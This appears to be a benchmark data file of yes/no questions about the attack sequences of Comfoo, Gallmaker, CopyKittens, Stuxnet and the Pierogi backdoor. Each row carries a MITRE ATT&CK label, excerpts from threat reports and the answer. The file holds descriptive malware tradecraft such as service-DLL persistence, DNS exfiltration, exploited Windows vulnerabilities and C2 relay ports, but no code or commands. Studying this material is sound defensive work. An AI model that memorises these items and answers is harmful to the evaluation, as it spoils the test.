648,182,182-Command and Control-T1090-Proxy,"After collecting system and network information via Comfoo RAT capabilities such as keystroke logging, screenshots, and file management, is it likely that the Comfoo C2 server will host a rendezvous-type traffic relay program and the relay server will listen on multiple TCP ports for executing proxy-related tasks to establish command and control using encrypted HTTP requests?","Command and Control: Comfoo's network traffic is encrypted and encapsulated in HTTP requests and responses, although some variants skip the encapsulation step. Payloads are encrypted by a 10-byte static XOR key that is hard-coded inside the Comfoo binary. Initial login data from the infected system (MAC address, internal IP address, campaign tag, and version data) is passed in the request URI and is additionally encrypted by a dynamic key. The Comfoo C2 server turns out to be a rendezvous-type traffic relay program. This small binary can be deployed on rented or hacked Windows systems, where it passes traffic between Comfoo victims and the Comfoo master console operated by the threat actors. The Comfoo relay server listens on up to three TCP ports at a time. The first port acts as a control and typically listens on port 1688. It performs the following tasks: Enables/disables the other ports, accepts new relay port configuration (stored in rlycfg.dll), notifies master console that a new victim connection is available. The second port is the admin relay port, which typically listens on port 1689. It accepts connections from the master console to send commands to and receive data from victims' systems. The third port is the victim relay port, which listens on a configurable port number, usually port 80 or port 443. This port accepts connections from victims' systems to send data to and receive commands from the Comfoo administrator encapsulated in HTTP requests and responses. If there is no current connection between the victim and the Comfoo administrator, Comfoo logs the victim's connection and sends an idle response to the victim.","Execution: To maintain persistence on the system, Comfoo usually replaces the path to the DLL of an existing unused service rather than installing a new service. A new service is more likely to be noticed by system audits. Sometimes Comfoo is delivered with a rootkit that hides Comfoo's files on disk. Additionally, Comfoo starts the existing ""ipnat"" system service. This action causes remote inbound connections to the infected system to fail, blocking remote maintenance by the network administrator.
Persistence: To maintain persistence on the system, Comfoo usually replaces the path to the DLL of an existing unused service rather than installing a new service. A new service is more likely to be noticed by system audits. Sometimes Comfoo is delivered with a rootkit that hides Comfoo's files on disk. Additionally, Comfoo starts the existing ""ipnat"" system service. This action causes remote inbound connections to the infected system to fail, blocking remote maintenance by the network administrator.
Collection: The Comfoo RAT has the following features: System/network information gathering, keystroke logging, screenshots, file upload/download/execute, command shell.
Others: The Dell SecureWorks Counter Threat Unit(TM) (CTU) research team has tracked a RAT known as ""Comfoo"" that has been in continuous development since at least 2006. This RAT has maintained a fairly low profile, even though it was used as part of the RSA breach in 2010, when its code was first analyzed. Antivirus firm Trend Micro briefly mentioned its use in a 2012 paper titled ""Luckycat Redux — Inside an APT Campaign with Multiple Targets in India and Japan."" However, the disclosure of this trojan and some of its command and control (C2) infrastructure did not discourage its continued use by the threat actors responsible for it. Dell SecureWorks researchers have identified and classified more than 200 distinct malware families used by various APT groups. Some malware is specially configured off-the-shelf software, and some malware is customized source code of an existing RAT. However, most malware families are proprietary, developed by the APT groups as weapons to be deployed against a variety of targets. Accurate identification and classification of this malware by antivirus (AV) companies is sparse. Shared code, the use of common tools, co-infections, and a history of generic or incorrect classification by multiple names make the automated tracking of these tools by AV companies difficult. This inaccuracy can be detrimental when designing defenses based on specific threat indicators. Tracking APTs requires a dedicated malware intelligence effort. One way applied malware intelligence is used to discover new APT trojans is a recursive investigative method: Malware -> Infrastructure Touchpoints -> New Malware -> and so on. Cyber-espionage actors often cycle through different RATs over a period of years. The Dell SecureWorks Counter Threat Unit(TM) (CTU) research team has tracked a RAT known as ""Comfoo"" that has been in continuous development since at least 2006. This RAT has maintained a fairly low profile, even though it was used as part of the RSA breach in 2010, when its code was first analyzed. Antivirus firm Trend Micro briefly mentioned its use in a 2012 paper titled ""Luckycat Redux — Inside an APT Campaign with Multiple Targets in India and Japan."" However, the disclosure of this trojan and some of its command and control (C2) infrastructure did not discourage its continued use by the threat actors responsible for it.",Yes,Secrets_of_the_Comfoo_Masters
651,182,182-Persistence-T1543-Create or Modify System Process,"After replacing the path to the DLL of an unused service and hiding Comfoo's files on disk using a rootkit, is it likely that Comfoo will execute the ""ipnat"" system service to block remote inbound connections before performing activities such as system information gathering and keystroke logging?","Persistence: To maintain persistence on the system, Comfoo usually replaces the path to the DLL of an existing unused service rather than installing a new service. A new service is more likely to be noticed by system audits. Sometimes Comfoo is delivered with a rootkit that hides Comfoo's files on disk. Additionally, Comfoo starts the existing ""ipnat"" system service. This action causes remote inbound connections to the infected system to fail, blocking remote maintenance by the network administrator.","Execution: To maintain persistence on the system, Comfoo usually replaces the path to the DLL of an existing unused service rather than installing a new service. A new service is more likely to be noticed by system audits. Sometimes Comfoo is delivered with a rootkit that hides Comfoo's files on disk. Additionally, Comfoo starts the existing ""ipnat"" system service. This action causes remote inbound connections to the infected system to fail, blocking remote maintenance by the network administrator.
Collection: The Comfoo RAT has the following features: System/network information gathering, keystroke logging, screenshots, file upload/download/execute, command shell.
Command and Control: Comfoo's network traffic is encrypted and encapsulated in HTTP requests and responses, although some variants skip the encapsulation step. Payloads are encrypted by a 10-byte static XOR key that is hard-coded inside the Comfoo binary. Initial login data from the infected system (MAC address, internal IP address, campaign tag, and version data) is passed in the request URI and is additionally encrypted by a dynamic key. The Comfoo C2 server turns out to be a rendezvous-type traffic relay program. This small binary can be deployed on rented or hacked Windows systems, where it passes traffic between Comfoo victims and the Comfoo master console operated by the threat actors. The Comfoo relay server listens on up to three TCP ports at a time. The first port acts as a control and typically listens on port 1688. It performs the following tasks: Enables/disables the other ports, accepts new relay port configuration (stored in rlycfg.dll), notifies master console that a new victim connection is available. The second port is the admin relay port, which typically listens on port 1689. It accepts connections from the master console to send commands to and receive data from victims' systems. The third port is the victim relay port, which listens on a configurable port number, usually port 80 or port 443. This port accepts connections from victims' systems to send data to and receive commands from the Comfoo administrator encapsulated in HTTP requests and responses. If there is no current connection between the victim and the Comfoo administrator, Comfoo logs the victim's connection and sends an idle response to the victim.
Others: The Dell SecureWorks Counter Threat Unit(TM) (CTU) research team has tracked a RAT known as ""Comfoo"" that has been in continuous development since at least 2006. This RAT has maintained a fairly low profile, even though it was used as part of the RSA breach in 2010, when its code was first analyzed. Antivirus firm Trend Micro briefly mentioned its use in a 2012 paper titled ""Luckycat Redux — Inside an APT Campaign with Multiple Targets in India and Japan."" However, the disclosure of this trojan and some of its command and control (C2) infrastructure did not discourage its continued use by the threat actors responsible for it. Dell SecureWorks researchers have identified and classified more than 200 distinct malware families used by various APT groups. Some malware is specially configured off-the-shelf software, and some malware is customized source code of an existing RAT. However, most malware families are proprietary, developed by the APT groups as weapons to be deployed against a variety of targets. Accurate identification and classification of this malware by antivirus (AV) companies is sparse. Shared code, the use of common tools, co-infections, and a history of generic or incorrect classification by multiple names make the automated tracking of these tools by AV companies difficult. This inaccuracy can be detrimental when designing defenses based on specific threat indicators. Tracking APTs requires a dedicated malware intelligence effort. One way applied malware intelligence is used to discover new APT trojans is a recursive investigative method: Malware -> Infrastructure Touchpoints -> New Malware -> and so on. Cyber-espionage actors often cycle through different RATs over a period of years. The Dell SecureWorks Counter Threat Unit(TM) (CTU) research team has tracked a RAT known as ""Comfoo"" that has been in continuous development since at least 2006. This RAT has maintained a fairly low profile, even though it was used as part of the RSA breach in 2010, when its code was first analyzed. Antivirus firm Trend Micro briefly mentioned its use in a 2012 paper titled ""Luckycat Redux — Inside an APT Campaign with Multiple Targets in India and Japan."" However, the disclosure of this trojan and some of its command and control (C2) infrastructure did not discourage its continued use by the threat actors responsible for it.",Yes,Secrets_of_the_Comfoo_Masters
653,182,182-Collection-T1113-Screen Capture,"After maintaining persistence on the system by replacing the DLL path of an unused service and potentially hiding files with a rootkit, is Comfoo RAT likely to capture screenshots as part of collecting system data before encapsulating network traffic within HTTP requests for communication with its C2 server?","Collection: The Comfoo RAT has the following features: System/network information gathering, keystroke logging, screenshots, file upload/download/execute, command shell.","Execution: To maintain persistence on the system, Comfoo usually replaces the path to the DLL of an existing unused service rather than installing a new service. A new service is more likely to be noticed by system audits. Sometimes Comfoo is delivered with a rootkit that hides Comfoo's files on disk. Additionally, Comfoo starts the existing ""ipnat"" system service. This action causes remote inbound connections to the infected system to fail, blocking remote maintenance by the network administrator.
Persistence: To maintain persistence on the system, Comfoo usually replaces the path to the DLL of an existing unused service rather than installing a new service. A new service is more likely to be noticed by system audits. Sometimes Comfoo is delivered with a rootkit that hides Comfoo's files on disk. Additionally, Comfoo starts the existing ""ipnat"" system service. This action causes remote inbound connections to the infected system to fail, blocking remote maintenance by the network administrator.
Command and Control: Comfoo's network traffic is encrypted and encapsulated in HTTP requests and responses, although some variants skip the encapsulation step. Payloads are encrypted by a 10-byte static XOR key that is hard-coded inside the Comfoo binary. Initial login data from the infected system (MAC address, internal IP address, campaign tag, and version data) is passed in the request URI and is additionally encrypted by a dynamic key. The Comfoo C2 server turns out to be a rendezvous-type traffic relay program. This small binary can be deployed on rented or hacked Windows systems, where it passes traffic between Comfoo victims and the Comfoo master console operated by the threat actors. The Comfoo relay server listens on up to three TCP ports at a time. The first port acts as a control and typically listens on port 1688. It performs the following tasks: Enables/disables the other ports, accepts new relay port configuration (stored in rlycfg.dll), notifies master console that a new victim connection is available. The second port is the admin relay port, which typically listens on port 1689. It accepts connections from the master console to send commands to and receive data from victims' systems. The third port is the victim relay port, which listens on a configurable port number, usually port 80 or port 443. This port accepts connections from victims' systems to send data to and receive commands from the Comfoo administrator encapsulated in HTTP requests and responses. If there is no current connection between the victim and the Comfoo administrator, Comfoo logs the victim's connection and sends an idle response to the victim.
Others: The Dell SecureWorks Counter Threat Unit(TM) (CTU) research team has tracked a RAT known as ""Comfoo"" that has been in continuous development since at least 2006. This RAT has maintained a fairly low profile, even though it was used as part of the RSA breach in 2010, when its code was first analyzed. Antivirus firm Trend Micro briefly mentioned its use in a 2012 paper titled ""Luckycat Redux — Inside an APT Campaign with Multiple Targets in India and Japan."" However, the disclosure of this trojan and some of its command and control (C2) infrastructure did not discourage its continued use by the threat actors responsible for it. Dell SecureWorks researchers have identified and classified more than 200 distinct malware families used by various APT groups. Some malware is specially configured off-the-shelf software, and some malware is customized source code of an existing RAT. However, most malware families are proprietary, developed by the APT groups as weapons to be deployed against a variety of targets. Accurate identification and classification of this malware by antivirus (AV) companies is sparse. Shared code, the use of common tools, co-infections, and a history of generic or incorrect classification by multiple names make the automated tracking of these tools by AV companies difficult. This inaccuracy can be detrimental when designing defenses based on specific threat indicators. Tracking APTs requires a dedicated malware intelligence effort. One way applied malware intelligence is used to discover new APT trojans is a recursive investigative method: Malware -> Infrastructure Touchpoints -> New Malware -> and so on. Cyber-espionage actors often cycle through different RATs over a period of years. The Dell SecureWorks Counter Threat Unit(TM) (CTU) research team has tracked a RAT known as ""Comfoo"" that has been in continuous development since at least 2006. This RAT has maintained a fairly low profile, even though it was used as part of the RSA breach in 2010, when its code was first analyzed. Antivirus firm Trend Micro briefly mentioned its use in a 2012 paper titled ""Luckycat Redux — Inside an APT Campaign with Multiple Targets in India and Japan."" However, the disclosure of this trojan and some of its command and control (C2) infrastructure did not discourage its continued use by the threat actors responsible for it.",Yes,Secrets_of_the_Comfoo_Masters
655,183,183-Execution-T1059-Command and Scripting Interpreter,"After exploiting the Microsoft Office Dynamic Data Exchange (DDE) protocol to gain initial access, is it likely that Gallmaker will utilize tools such as WindowsRoamingToolsTask and the reverse_tcp payload for execution before adopting living off the land (LotL) tactics for defense evasion?","Execution: Upon gaining access to a victim's device, Gallmaker executed various tools including WindowsRoamingToolsTask for scheduling PowerShell scripts and tasks, a 'reverse_tcp' payload from Metasploit via obfuscated PowerShell, a legitimate version of the WinZip console for command execution and potential data exfiltration, and the Rex PowerShell library from GitHub for creating and manipulating PowerShell scripts for Metasploit exploits.","Initial Access: The Gallmaker group initiated their attack by delivering malicious Office documents, likely through spear-phishing emails, with titles related to government, military, and diplomatic themes. These documents, with filenames in English or Cyrillic, attempted to exploit the Microsoft Office Dynamic Data Exchange (DDE) protocol to execute commands in memory on the victim's system when the content was enabled, thus avoiding leaving artifacts on disk.
Defense Evasion: Gallmaker's use of living off the land (LotL) tactics and publicly available hack tools, as well as their practice of deleting tools from victim machines after use, helped them avoid detection. They exploited the DDE protocol to execute code remotely without leaving artifacts on disk.
Command and Control: Gallmaker used three primary IP addresses for command-and-control (C&C) infrastructure to communicate with infected devices. They also likely used the WinZip console to archive data for exfiltration.
Exfiltration: The legitimate version of the WinZip console was likely used by Gallmaker to archive data, probably for the purpose of exfiltration.
Others: Gallmaker targeted government, military, and defense sectors, including overseas embassies of an Eastern European country and military and defense targets in the Middle East. The group has been active since at least December 2017, with the most recent activity observed in June 2018. Their activities are indicative of a cyber espionage campaign, likely state-sponsored. Symantec's Targeted Attack Analytics (TAA) technology played a crucial role in detecting Gallmaker's activities, which relied on LotL tactics and publicly available hack tools to avoid detection. Protections against Gallmaker attacks include System Infected: Meterpreter Reverse TCP and W97M.Downloader. Network protection products also detect activity associated with Gallmaker. Indicators of Compromise (IoCs) specific to Gallmaker have been updated, and Yara rules and methods used by Gallmaker are shared for detection of unauthorized activity.",Yes,Gallmaker New Attack Group Eschews Malware to Live off the Land
660,183,183-Command and Control-T1573-Encrypted Channel,"After utilizing malicious Office documents to exploit the Dynamic Data Exchange (DDE) protocol for initial access and executing obfuscated PowerShell payloads for tasks and exploit management, is it likely that Gallmaker will use IP addresses as part of their command-and-control infrastructure before potentially archiving data for exfiltration with the WinZip console?",Command and Control: Gallmaker used three primary IP addresses for command-and-control (C&C) infrastructure to communicate with infected devices. They also likely used the WinZip console to archive data for exfiltration.,"Initial Access: The Gallmaker group initiated their attack by delivering malicious Office documents, likely through spear-phishing emails, with titles related to government, military, and diplomatic themes. These documents, with filenames in English or Cyrillic, attempted to exploit the Microsoft Office Dynamic Data Exchange (DDE) protocol to execute commands in memory on the victim's system when the content was enabled, thus avoiding leaving artifacts on disk.
Execution: Upon gaining access to a victim's device, Gallmaker executed various tools including WindowsRoamingToolsTask for scheduling PowerShell scripts and tasks, a 'reverse_tcp' payload from Metasploit via obfuscated PowerShell, a legitimate version of the WinZip console for command execution and potential data exfiltration, and the Rex PowerShell library from GitHub for creating and manipulating PowerShell scripts for Metasploit exploits.
Defense Evasion: Gallmaker's use of living off the land (LotL) tactics and publicly available hack tools, as well as their practice of deleting tools from victim machines after use, helped them avoid detection. They exploited the DDE protocol to execute code remotely without leaving artifacts on disk.
Exfiltration: The legitimate version of the WinZip console was likely used by Gallmaker to archive data, probably for the purpose of exfiltration.
Others: Gallmaker targeted government, military, and defense sectors, including overseas embassies of an Eastern European country and military and defense targets in the Middle East. The group has been active since at least December 2017, with the most recent activity observed in June 2018. Their activities are indicative of a cyber espionage campaign, likely state-sponsored. Symantec's Targeted Attack Analytics (TAA) technology played a crucial role in detecting Gallmaker's activities, which relied on LotL tactics and publicly available hack tools to avoid detection. Protections against Gallmaker attacks include System Infected: Meterpreter Reverse TCP and W97M.Downloader. Network protection products also detect activity associated with Gallmaker. Indicators of Compromise (IoCs) specific to Gallmaker have been updated, and Yara rules and methods used by Gallmaker are shared for detection of unauthorized activity.",Yes,Gallmaker New Attack Group Eschews Malware to Live off the Land
669,184,184-Credential Access-T1555-Credentials from Password Stores,"After the RAT component configures the Reflective Loader to survive reboots and process exits and establishes DNS Command and Control communication, is it likely that the CopyKittens group will proceed to leverage the RAT to steal Outlook passwords as part of acquiring credentials from password stores?","Credential Access: The RAT was capable of stealing Outlook passwords, a method that may have been copied from SecurityExploded's description for 'Recovering Passwords from Outlook 2002-2013'.","Initial Access: The CopyKittens attack group initiated their cyber-attacks with spear phishing emails containing infected document files as attachments. These emails were carefully crafted with subjects that matched the interests of the targets, such as high-ranking diplomats and academic researchers. The documents contained OLE binary objects with deceptive names using the Right-To-Left Override Unicode character to appear as harmless file types.
Execution: The CopyKittens group employed a multi-stage infection framework named 'Matryoshka'. The first stage involved a dropper, an SCR PE file, which obfuscated code and signaled to the C2 server upon execution. It launched a loader to execute functions and compared anti-analysis logic, reporting back to C2. The second stage, the Reflective Loader, used anti-debugging and anti-sandboxing techniques, runtime API address resolution, covert DLL injection of the RAT library, and ensured persistence on disk. The third stage was the RAT component, which configured the Reflective Loader to survive reboots and process exits, established DNS Command and Control communication, and provided common RAT functionalities.
Persistence: The RAT component of the Matryoshka framework ensured its persistence by copying the reflective loader to common Windows folders and creating a registry key for automatic execution upon system boot. Additionally, it scheduled a task named 'Microsoft Boost Kernel Optimization' to rerun the injection routine every 20 minutes, using a global mutex to prevent multiple instances from causing instability.
Defense Evasion: The CopyKittens group utilized techniques to avoid detection, such as employing anti-debugging and anti-sandboxing methods, and runtime API address resolution with obfuscated strings. They also used a global mutex to reduce the risk of multiple RAT instances running simultaneously.
Collection: The RAT had capabilities for screen grabbing and keylogging, with portions of the source code traced back to the rohitab.com online forum.
Command and Control: The RAT used the DNS protocol to communicate with the C2 server, constructing DNS queries with a unique ID of the infected machine, a random string, and obfuscated data to be transmitted. The group used substitute ciphers to disguise the DNS traffic and made it difficult for traffic analysis and detection by using IP addresses from Microsoft and McAfee in the C2 responses.
Exfiltration: Data exfiltration was performed over the DNS protocol, with the RAT translating received commands from the C2 server into corresponding actions, such as stealing Outlook passwords when a specific IP address was received in the DNS response.
Others: The CopyKittens attack group is a mid-level threat actor known for their effective and stealthy multi-stage attacks, avoiding the use of known RATs and packers by developing 'homemade' tools. They have shown constant development to overcome security product improvements. The group's targets have included high-ranking diplomats and researchers specializing in Middle East Studies. The group's attack tool, 'Matryoshka', is a multi-stage framework with each part built to integrate with the subsequent step. The group's activities suggest that they will continue to target similar profiles in the future.",Yes,CopyKittens
673,184,184-Exfiltration-T1048-Exfiltration Over Alternative Protocol,"After the RAT establishes DNS Command and Control communication by constructing unique DNS queries with obfuscated data, is it likely that the CopyKittens group will perform data exfiltration over the DNS protocol as part of their attack sequence?","Exfiltration: Data exfiltration was performed over the DNS protocol, with the RAT translating received commands from the C2 server into corresponding actions, such as stealing Outlook passwords when a specific IP address was received in the DNS response.","Initial Access: The CopyKittens attack group initiated their cyber-attacks with spear phishing emails containing infected document files as attachments. These emails were carefully crafted with subjects that matched the interests of the targets, such as high-ranking diplomats and academic researchers. The documents contained OLE binary objects with deceptive names using the Right-To-Left Override Unicode character to appear as harmless file types.
Execution: The CopyKittens group employed a multi-stage infection framework named 'Matryoshka'. The first stage involved a dropper, an SCR PE file, which obfuscated code and signaled to the C2 server upon execution. It launched a loader to execute functions and compared anti-analysis logic, reporting back to C2. The second stage, the Reflective Loader, used anti-debugging and anti-sandboxing techniques, runtime API address resolution, covert DLL injection of the RAT library, and ensured persistence on disk. The third stage was the RAT component, which configured the Reflective Loader to survive reboots and process exits, established DNS Command and Control communication, and provided common RAT functionalities.
Persistence: The RAT component of the Matryoshka framework ensured its persistence by copying the reflective loader to common Windows folders and creating a registry key for automatic execution upon system boot. Additionally, it scheduled a task named 'Microsoft Boost Kernel Optimization' to rerun the injection routine every 20 minutes, using a global mutex to prevent multiple instances from causing instability.
Defense Evasion: The CopyKittens group utilized techniques to avoid detection, such as employing anti-debugging and anti-sandboxing methods, and runtime API address resolution with obfuscated strings. They also used a global mutex to reduce the risk of multiple RAT instances running simultaneously.
Credential Access: The RAT was capable of stealing Outlook passwords, a method that may have been copied from SecurityExploded's description for 'Recovering Passwords from Outlook 2002-2013'.
Collection: The RAT had capabilities for screen grabbing and keylogging, with portions of the source code traced back to the rohitab.com online forum.
Command and Control: The RAT used the DNS protocol to communicate with the C2 server, constructing DNS queries with a unique ID of the infected machine, a random string, and obfuscated data to be transmitted. The group used substitute ciphers to disguise the DNS traffic and made it difficult for traffic analysis and detection by using IP addresses from Microsoft and McAfee in the C2 responses.
Others: The CopyKittens attack group is a mid-level threat actor known for their effective and stealthy multi-stage attacks, avoiding the use of known RATs and packers by developing 'homemade' tools. They have shown constant development to overcome security product improvements. The group's targets have included high-ranking diplomats and researchers specializing in Middle East Studies. The group's attack tool, 'Matryoshka', is a multi-stage framework with each part built to integrate with the subsequent step. The group's activities suggest that they will continue to target similar profiles in the future.",Yes,CopyKittens
680,185,185-Lateral Movement-T1210-Exploitation of Remote Services,"After achieving persistence by installing kernel-mode drivers and modifying system files and registry keys, is Stuxnet likely to utilize the MS08-067 RPC vulnerability and the MS10-061 Print Spooler vulnerability for lateral movement through networked machines before communicating with Command and Control servers using predefined encrypted URLs?","Lateral Movement: Stuxnet propagated laterally through networks by exploiting vulnerabilities and shared resources. It used the MS08-067 RPC vulnerability and the MS10-061 Print Spooler vulnerability to spread itself across networked machines. The worm also scanned network shares and installed its dropper on accessible systems. Stuxnet's lateral movement capabilities allowed it to infect multiple systems within a targeted network, increasing its reach and impact.","Initial Access: The Stuxnet worm exploited the CVE-2010-2568 vulnerability to gain initial access to systems. This vulnerability was related to the way Windows displayed shortcut icons. Stuxnet used malicious .LNK files that, when viewed, would automatically execute the malware without user interaction. The worm specifically targeted SCADA systems, but its propagation method allowed it to spread widely. The initial infection vector was through removable drives, such as USB flash drives, which contained the malicious .LNK files and two TMP files (~WTR4141.TMP and ~WTR4132.TMP). The .LNK files were crafted to load the ~WTR4141.TMP file, which in turn would load and execute the ~WTR4132.TMP file, leading to the infection of the host machine.
Execution: Stuxnet's execution phase involved running malicious code on both local and remote systems. The worm's main module, a DLL packed with UPX, contained multiple resources including two kernel-mode drivers (MrxCls.sys and MrxNet.sys) and additional user-mode components. These drivers were responsible for injecting code into processes and hiding files used for propagation. Stuxnet also replaced legitimate system files with malicious versions to maintain persistence and control over infected systems. The malware executed exported functions from its main module to perform various tasks, such as building and running its dropper, spreading through the network, and communicating with command and control (C&C) servers.
Persistence: Stuxnet achieved persistence by installing kernel-mode drivers and user-mode components onto infected systems. It used a boot start service to ensure its kernel-mode driver (MrxCls.sys) was loaded early in the OS boot process. The driver injected code into specific processes and monitored system behavior to maintain control. Additionally, Stuxnet modified system files and registry keys to ensure it was executed upon system startup.
Privilege Escalation: Stuxnet utilized two zero-day vulnerabilities, MS10-073 and MS10-092, to escalate privileges on infected systems. The MS10-073 vulnerability in the win32k.sys system module allowed Stuxnet to execute arbitrary code with SYSTEM privileges by loading a specially crafted keyboard layout file. The MS10-092 vulnerability in the Windows Task Scheduler Service enabled Stuxnet to elevate its privileges up to SYSTEM level by manipulating the metadata of scheduled tasks. The worm used these elevated privileges to perform actions that would otherwise be restricted.
Defense Evasion: Stuxnet employed multiple techniques to evade detection and analysis. It used rootkit functionality to hide its presence on infected systems, including hiding files and injecting code into processes. The worm also utilized stolen digital certificates to sign its kernel-mode drivers, making them appear as legitimate software components. Additionally, Stuxnet patched system libraries and hooked functions to load non-existent libraries, reducing the likelihood of detection by heuristic methods.
Command and Control: Stuxnet communicated with C&C servers using HTTP. It encrypted its communications and sent data to predefined URLs, which included both decoy URLs (such as www.windowsupdate.com) and actual C&C server URLs (such as www.mypremierfutbol.com). The worm's C&C protocol involved sending system information and receiving commands or updates. Stuxnet also implemented an RPC server for peer-to-peer communication, allowing it to receive updates from other infected machines on the network.",Yes,Stuxnet_Under_the_Microscope
683,185,185-Command and Control-T1573-Encrypted Channel,"After exploiting the MS08-067 RPC and MS10-061 Print Spooler vulnerabilities for lateral movement within the network, is it likely that Stuxnet will communicate with its C&C servers using encrypted channels to send system information and receive commands or updates?","Command and Control: Stuxnet communicated with C&C servers using HTTP. It encrypted its communications and sent data to predefined URLs, which included both decoy URLs (such as www.windowsupdate.com) and actual C&C server URLs (such as www.mypremierfutbol.com). The worm's C&C protocol involved sending system information and receiving commands or updates. Stuxnet also implemented an RPC server for peer-to-peer communication, allowing it to receive updates from other infected machines on the network.","Initial Access: The Stuxnet worm exploited the CVE-2010-2568 vulnerability to gain initial access to systems. This vulnerability was related to the way Windows displayed shortcut icons. Stuxnet used malicious .LNK files that, when viewed, would automatically execute the malware without user interaction. The worm specifically targeted SCADA systems, but its propagation method allowed it to spread widely. The initial infection vector was through removable drives, such as USB flash drives, which contained the malicious .LNK files and two TMP files (~WTR4141.TMP and ~WTR4132.TMP). The .LNK files were crafted to load the ~WTR4141.TMP file, which in turn would load and execute the ~WTR4132.TMP file, leading to the infection of the host machine.
Execution: Stuxnet's execution phase involved running malicious code on both local and remote systems. The worm's main module, a DLL packed with UPX, contained multiple resources including two kernel-mode drivers (MrxCls.sys and MrxNet.sys) and additional user-mode components. These drivers were responsible for injecting code into processes and hiding files used for propagation. Stuxnet also replaced legitimate system files with malicious versions to maintain persistence and control over infected systems. The malware executed exported functions from its main module to perform various tasks, such as building and running its dropper, spreading through the network, and communicating with command and control (C&C) servers.
Persistence: Stuxnet achieved persistence by installing kernel-mode drivers and user-mode components onto infected systems. It used a boot start service to ensure its kernel-mode driver (MrxCls.sys) was loaded early in the OS boot process. The driver injected code into specific processes and monitored system behavior to maintain control. Additionally, Stuxnet modified system files and registry keys to ensure it was executed upon system startup.
Privilege Escalation: Stuxnet utilized two zero-day vulnerabilities, MS10-073 and MS10-092, to escalate privileges on infected systems. The MS10-073 vulnerability in the win32k.sys system module allowed Stuxnet to execute arbitrary code with SYSTEM privileges by loading a specially crafted keyboard layout file. The MS10-092 vulnerability in the Windows Task Scheduler Service enabled Stuxnet to elevate its privileges up to SYSTEM level by manipulating the metadata of scheduled tasks. The worm used these elevated privileges to perform actions that would otherwise be restricted.
Defense Evasion: Stuxnet employed multiple techniques to evade detection and analysis. It used rootkit functionality to hide its presence on infected systems, including hiding files and injecting code into processes. The worm also utilized stolen digital certificates to sign its kernel-mode drivers, making them appear as legitimate software components. Additionally, Stuxnet patched system libraries and hooked functions to load non-existent libraries, reducing the likelihood of detection by heuristic methods.
Lateral Movement: Stuxnet propagated laterally through networks by exploiting vulnerabilities and shared resources. It used the MS08-067 RPC vulnerability and the MS10-061 Print Spooler vulnerability to spread itself across networked machines. The worm also scanned network shares and installed its dropper on accessible systems. Stuxnet's lateral movement capabilities allowed it to infect multiple systems within a targeted network, increasing its reach and impact.",Yes,Stuxnet_Under_the_Microscope
689,186,186-Defense Evasion-T1562-Impair Defenses,"After victims open malicious Microsoft Word documents that execute a macro to download and install the Pierogi backdoor, is the backdoor likely to achieve persistence by adding a shortcut to the startup folder before implementing checks for antivirus and security products using WMI?","Defense Evasion: The Pierogi backdoor implemented checks for antivirus and security products, querying Windows for installed antivirus software using WMI and looking for specific products like Kaspersky and Bitdefender. It also used techniques such as file deletion and software packing to evade detection.","Initial Access: The campaign targeting Palestinian individuals and entities began with social engineering tactics. Attackers lured victims into opening email attachments or downloading reports on political affairs related to Palestine. The malicious files were disguised as Microsoft Word documents or executables, with names such as 'Reports on major developments__347678363764' and 'Employee-entitlements-2020.doc'.
Execution: Upon opening the malicious documents, victims were presented with decoy content to lower their suspicions while the Pierogi backdoor was installed. The decoy documents included politically charged content, such as fake government documents, news about Hamas, and criticism of Hamas. Weaponized Microsoft Word documents contained an embedded downloader macro that, when enabled, downloaded and executed the Pierogi backdoor.
Persistence: The Pierogi backdoor achieved persistence by adding a shortcut to the startup folder, ensuring it ran upon user login. The shortcut pointed to the backdoor's binary location in the 'C:\ProgramData\' folder.
Discovery: The backdoor was capable of collecting information about the infected machine, including computer name, username, GUID, antivirus name, and operating system version.
Collection: Pierogi's capabilities included taking screenshots and executing arbitrary commands via the CMD shell, which could be used for data collection.
Command and Control: The backdoor communicated with C2 servers using predefined URLs for sending machine information, receiving commands, and uploading data such as screenshots. It also had the ability to remove information based on commands from the C2 server.
Exfiltration: Data exfiltration was performed through web services, with the backdoor uploading screenshots to the C2 server.
Others: The campaign, suspected to be conducted by MoleRATs, an Arabic-speaking APT group, used the Pierogi backdoor for cyber espionage. The backdoor, written in Delphi, had basic capabilities and checks for a safe running environment. The infrastructure for the campaign was created in November 2019, with domains registered and operationalized shortly after. Cybereason raises the possibility that the backdoor was obtained from underground communities rather than developed in-house.",Yes,"New Cyber Espionage Campaigns Targeting Palestinians - Part 2_ The Discovery of the New, Mysterious Pierogi Backdoor"
692,186,186-Command and Control-T1102-Web Service,"After the Pierogi backdoor conducts discovery activities by collecting system information such as computer name, username, and operating system version, is it likely to communicate with C2 servers using predefined URLs for sending machine information and receiving commands?","Command and Control: The backdoor communicated with C2 servers using predefined URLs for sending machine information, receiving commands, and uploading data such as screenshots. It also had the ability to remove information based on commands from the C2 server.","Initial Access: The campaign targeting Palestinian individuals and entities began with social engineering tactics. Attackers lured victims into opening email attachments or downloading reports on political affairs related to Palestine. The malicious files were disguised as Microsoft Word documents or executables, with names such as 'Reports on major developments__347678363764' and 'Employee-entitlements-2020.doc'.
Execution: Upon opening the malicious documents, victims were presented with decoy content to lower their suspicions while the Pierogi backdoor was installed. The decoy documents included politically charged content, such as fake government documents, news about Hamas, and criticism of Hamas. Weaponized Microsoft Word documents contained an embedded downloader macro that, when enabled, downloaded and executed the Pierogi backdoor.
Persistence: The Pierogi backdoor achieved persistence by adding a shortcut to the startup folder, ensuring it ran upon user login. The shortcut pointed to the backdoor's binary location in the 'C:\ProgramData\' folder.
Defense Evasion: The Pierogi backdoor implemented checks for antivirus and security products, querying Windows for installed antivirus software using WMI and looking for specific products like Kaspersky and Bitdefender. It also used techniques such as file deletion and software packing to evade detection.
Discovery: The backdoor was capable of collecting information about the infected machine, including computer name, username, GUID, antivirus name, and operating system version.
Collection: Pierogi's capabilities included taking screenshots and executing arbitrary commands via the CMD shell, which could be used for data collection.
Exfiltration: Data exfiltration was performed through web services, with the backdoor uploading screenshots to the C2 server.
Others: The campaign, suspected to be conducted by MoleRATs, an Arabic-speaking APT group, used the Pierogi backdoor for cyber espionage. The backdoor, written in Delphi, had basic capabilities and checks for a safe running environment. The infrastructure for the campaign was created in November 2019, with domains registered and operationalized shortly after. Cybereason raises the possibility that the backdoor was obtained from underground communities rather than developed in-house.",Yes,"New Cyber Espionage Campaigns Targeting Palestinians - Part 2_ The Discovery of the New, Mysterious Pierogi Backdoor"
